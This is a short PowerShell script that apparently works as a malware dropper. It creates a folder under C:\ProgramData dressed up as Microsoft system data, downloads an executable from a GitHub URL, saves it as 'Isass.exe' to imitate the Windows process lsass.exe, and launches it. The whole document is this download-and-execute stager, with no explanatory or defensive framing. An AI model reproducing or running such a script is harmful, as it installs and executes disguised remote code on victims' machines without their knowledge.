$path = 'C:\ProgramData\MicrosoftCorporation\Windows\SystemData\'
$fpath = $path + 'Isass.exe'
$furl = 'https://github.com/foxovsky/PointBlank/raw/master/server/Auth/bin/Release/Game.exe'
 
$isfile = Test-Path $fpath 
if($isfile -eq 'True') {}
else
{
	New-Item -ItemType directory -Path $path
	$WebClient = New-Object System.Net.WebClient
	$WebClient.DownloadFile($furl,$fpath)
	Start-Process -FilePath $fpath
}